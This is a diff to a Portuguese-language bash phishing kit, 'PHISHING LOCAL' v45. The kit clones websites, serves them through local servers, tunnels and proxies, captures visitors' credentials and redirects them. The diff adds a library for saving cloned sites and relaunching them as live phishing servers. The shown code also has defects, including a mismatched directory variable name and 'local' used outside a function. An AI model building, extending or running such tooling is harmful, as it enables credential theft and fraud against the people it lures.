@@ -1,6 +1,6 @@
 #!/bin/bash
 # ============================================
-# 🎣 PHISHING LOCAL v43 - Clonador Profissional
+# 🎣 PHISHING LOCAL v45 - Clonador Profissional
 # 1 Phish 2 Capturas 3 Túnel 4 Histórico 5 Localhost 6 Link 7 Status 8 Parar 9 Proxy 0 Sair
 # ============================================
 
@@ -19,7 +19,8 @@ CAPTURED_DIR="$SCRIPT_DIR/captured_sites"
 TUNNEL_LOG="$SCRIPT_DIR/.tunnel.log"
 SCAN_LOG="$SCRIPT_DIR/.scan_result"
 
-mkdir -p "$CAPTURED_DIR" "$SITE_DIR"
+saved_CLONES_DIR="$SCRIPT_DIR/saved_clones"
+mkdir -p "$SAVED_CLONES_DIR" "$CAPTURED_DIR" "$SITE_DIR"
 
 # =============================================
 # VERIFICAR NODE.JS
@@ -504,6 +505,182 @@ view_capturas() {
 }
 
 # =============================================
+# CLONES SALVOS - BIBLIOTECA
+# =============================================
+save_clone() {
+    local name="$1"
+    local savedir="$SAVED_CLONES_DIR/$name"
+    mkdir -p "$savedir"
+
+    # Copiar arquivos do site_clone
+    cp -r "$SITE_DIR"/* "$savedir/" 2>/dev/null
+
+    # Salvar metadata
+    local metadata="$savedir/.meta"
+    echo "URL=$2" > "$metadata"
+    echo "REDIRECT=$3" >> "$metadata"
+    echo "PORT=$4" >> "$metadata"
+    echo "DATE=$(date '+%Y-%m-%d %H:%M')" >> "$metadata"
+    echo "PROXY=$5" >> "$metadata"
+
+    # Contar arquivos
+    local files=$(find "$savedir" -type f ! -name ".meta" | wc -l)
+    echo "FILES=$files" >> "$metadata"
+
+    chmod 644 "$metadata"
+    echo "$savedir"
+}
+
+show_saved_clones() {
+    clear
+    echo -e "${CYAN}  ═══════════════════════════════════════${NC}"
+    echo -e "${CYAN}         CLONES SALVOS${NC}"
+    echo -e "${CYAN}  ═══════════════════════════════════════${NC}"
+    echo ""
+
+    # Contar clones salvos
+    local count=0
+    for d in "$SAVED_CLONES_DIR"/*/; do [ -d "$d" ] && count=$((count + 1)); done
+
+    if [ "$count" -eq 0 ]; then
+        echo -e "  ${RED}Nenhum clone salvo ainda.${NC}"
+        echo ""
+        echo -e "  ${YELLOW}Clone um site (opcao 1) e escolha 'salvar' no final.${NC}"
+        echo ""
+        echo -e "${YELLOW}Press Enter...${NC}"
+        read
+        return
+    fi
+
+    # Listar
+    local idx=1
+    for d in "$SAVED_CLONES_DIR"/*/; do
+        [ -d "$d" ] || continue
+        local meta="$d/.meta"
+        local url="?" redirect="?" port="?" date="?" files="?"
+        [ -f "$meta" ] && {
+            url=$(grep "^URL=" "$meta" 2>/dev/null | cut -d= -f2-)
+            port=$(grep "^PORT=" "$meta" 2>/dev/null | cut -d= -f2-)
+            date=$(grep "^DATE=" "$meta" 2>/dev/null | cut -d= -f2-)
+            files=$(grep "^FILES=" "$meta" 2>/dev/null | cut -d= -f2-)
+        }
+        local sz=$(du -sh "$d" 2>/dev/null | cut -f1)
+
+        # Detectar se e o clone ativo
+        local active=""
+        if [ -f "$SCRIPT_DIR/.active_clone" ] && [ "$(cat "$SCRIPT_DIR/.active_clone" 2>/dev/null)" = "$d" ]; then
+            active=" ${GREEN}<< ATIVO${NC}"
+        fi
+
+        echo -e "  ${WHITE}[$idx]${NC} ${YELLOW}$(basename "$d")${NC}$active"
+        echo -e "       URL: ${WHITE}$url${NC} | Porta: ${port} | ${sz} (${files} arq) | ${date}"
+        echo ""
+        idx=$((idx + 1))
+    done
+
+    echo ""
+    echo -e "  ${GREEN}A) Ativar clone (informe o numero)${NC}"
+    echo -e "  ${RED}E) Excluir clone${NC}"
+    echo -e "  ${WHITE}Enter) Voltar${NC}"
+    echo -n "> "
+    read ACTION
+
+    case "$ACTION" in
+        a|A)
+            echo -n "  Numero: "
+            read NUM
+            [ -z "$NUM" ] && { read; return; }
+
+            local target_dir=""
+            local cur=1
+            for d in "$SAVED_CLONES_DIR"/*/; do
+                [ -d "$d" ] || continue
+                if [ "$cur" = "$NUM" ]; then target_dir="$d"; break; fi
+                cur=$((cur + 1))
+            done
+
+            if [ -z "$target_dir" ] || [ ! -d "$target_dir" ]; then
+                echo -e "  ${RED}Numero invalido!${NC}"
+                read; return
+            fi
+
+            # Carregar metadata
+            local meta="$target_dir/.meta"
+            local s_url="" s_port="8080" s_redir="" s_proxy="n"
+            [ -f "$meta" ] && {
+                s_url=$(grep "^URL=" "$meta" 2>/dev/null | cut -d= -f2-)
+                s_port=$(grep "^PORT=" "$meta" 2>/dev/null | cut -d= -f2-)
+                s_redir=$(grep "^REDIRECT=" "$meta" 2>/dev/null | cut -d= -f2-)
+                s_proxy=$(grep "^PROXY=" "$meta" 2>/dev/null | cut -d= -f2-)
+            }
+            [ -z "$s_port" ] && s_port=8080
+
+            echo -e "  ${YELLOW}Ativando clone...${NC}"
+
+            # Limpar site_clone e copiar salvo
+            rm -rf "$SITE_DIR"/*
+            cp -r "$target_dir"/* "$SITE_DIR/" 2>/dev/null
+            # Remover metadata do site ativo
+            rm -f "$SITE_DIR/.meta"
+
+            # Registrar clone ativo
+            echo "$target_dir" > "$SCRIPT_DIR/.active_clone"
+
+            # Iniciar servidor
+            echo -n "  Porta ($s_port): "
+            read PT
+            [ -z "$PT" ] && PT="$s_port"
+
+            pkill -9 -f "node.*server.js" 2>/dev/null; sleep 2
+            local my_ip=$(get_my_ip)
+            REDIRECT_URL="$s_redir" PORT="$PT" SITE_DIR="$SITE_DIR" LOG_FILE="$LOG_FILE" nohup node "$SCRIPT_DIR/server/server.js" > "$SCRIPT_DIR/server.log" 2>&1 &
+            local pid=$!; disown "$pid" 2>/dev/null
+            echo "$pid" > "$SCRIPT_DIR/.server.pid"
+            sleep 3
+
+            if kill -0 "$pid" 2>/dev/null; then
+                echo -e "  ${GREEN}[OK] Clone ativado! PID: $pid${NC}"
+                echo -e "  ${GREEN}http://${my_ip}:${PT}${NC}"
+            else
+                echo -e "  ${RED}[ERRO] Servidor nao subiu${NC}"
+                tail -3 "$SCRIPT_DIR/server.log" 2>/dev/null | while read l; do echo -e "    ${RED}$l${NC}"; done
+            fi
+            echo ""
+            echo -e "${YELLOW}Press Enter...${NC}"
+            read
+            ;;
+        e|E)
+            echo -n "  Numero para excluir: "
+            read NUM
+            [ -z "$NUM" ] && { read; return; }
+
+            local del_dir=""
+            local cur=1
+            for d in "$SAVED_CLONES_DIR"/*/; do
+                [ -d "$d" ] || continue
+                if [ "$cur" = "$NUM" ]; then del_dir="$d"; break; fi
+                cur=$((cur + 1))
+            done
+
+            if [ -z "$del_dir" ] || [ ! -d "$del_dir" ]; then
+                echo -e "  ${RED}Numero invalido!${NC}"
+                read; return
+            fi
+
+            rm -rf "$del_dir"
+
+            # Se era o clone ativo, desmarcar
+            if [ -f "$SCRIPT_DIR/.active_clone" ] && [ "$(cat "$SCRIPT_DIR/.active_clone")" = "$del_dir" ]; then
+                rm -f "$SCRIPT_DIR/.active_clone"
+            fi
+
+            echo -e "  ${GREEN}[OK] Removido${NC}"
+            read
+            ;;
+    esac
+}
+
+# =============================================
 # TUNNEL
 # =============================================
 start_tunnel() {
@@ -901,7 +1078,7 @@ while true; do
     echo -e "  ██║     ██║  ██║██║███████║██║  ██║"
     echo -e "  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝"
     echo ""
-    echo -e "  🎣 PHISHING LOCAL ${CYAN}v43${NC}"
+    echo -e "  🎣 PHISHING LOCAL ${CYAN}v45${NC}"
     echo ""
     echo "  ─────────────────────────────────────────"
     echo ""
@@ -914,6 +1091,7 @@ while true; do
     echo -e "  📊 7) STATUS    - Sistema"
     echo -e "  🛑 8) PARAR     - Desligar"
     echo -e "  🔓 9) PROXY     - Clonar com proxy"
+    echo -e "  📦 c) SALVOS     - Biblioteca de clones"
     echo ""
     echo -e "  ❌ 0) SAIR"
     echo ""
@@ -1002,12 +1180,12 @@ while true; do
             echo ""
 
             # Salvar hora do inicio
-            readonly CLONE_START=$(date +%s)
+            local CLONE_START=$(date +%s)
 
             clone_site "$URL" "$REDIR" "$PT" "$use_proxy"
 
-            readonly CLONE_END=$(date +%s)
-            readonly CLONE_ELAPSED=$((CLONE_END - CLONE_START))
+            local CLONE_END=$(date +%s)
+            local CLONE_ELAPSED=$((CLONE_END - CLONE_START))
 
             # Resultado
             echo ""
@@ -1033,6 +1211,20 @@ while true; do
             local curl_err=$(grep -ci "error\|curl" "$SCRIPT_DIR/curl.log" 2>/dev/null || echo 0)
             [ "$curl_err" -gt 0 ] && echo -e "  ${YELLOW}Erros curl: ${curl_err}${NC}"
 
+            # Perguntar se quer salvar clone
+            echo ""
+            echo -n "  Salvar clone pra biblioteca? (s/n): "
+            read SAVE
+            if echo "$SAVE" | grep -qi "^s"; then
+                local safe_url=$(echo "$URL" | sed -E 's|.*://||;s|[^a-zA-Z0-9._-]|_|g' | head -c 40)
+                local saved_path=$(save_clone "$safe_url" "$URL" "$REDIR" "$PT" "$use_proxy")
+                if [ -n "$saved_path" ] && [ -d "$saved_path" ]; then
+                    echo -e "  ${GREEN}[OK] Clone salvo! Use 'c' no menu.${NC}"
+                else
+                    echo -e "  ${RED}Falha ao salvar${NC}"
+                fi
+            fi
+
             echo ""
             echo -e "${YELLOW}Press Enter...${NC}"
             read
@@ -1047,6 +1239,7 @@ while true; do
         7) show_status ;;
         8) stop_all; read ;;
         9) do_proxy_clone ;;
+        c) show_saved_clones ;;
         0) stop_all; exit 0 ;;
         *) echo -e "${RED}Invalido!${NC}" ;;
     esac
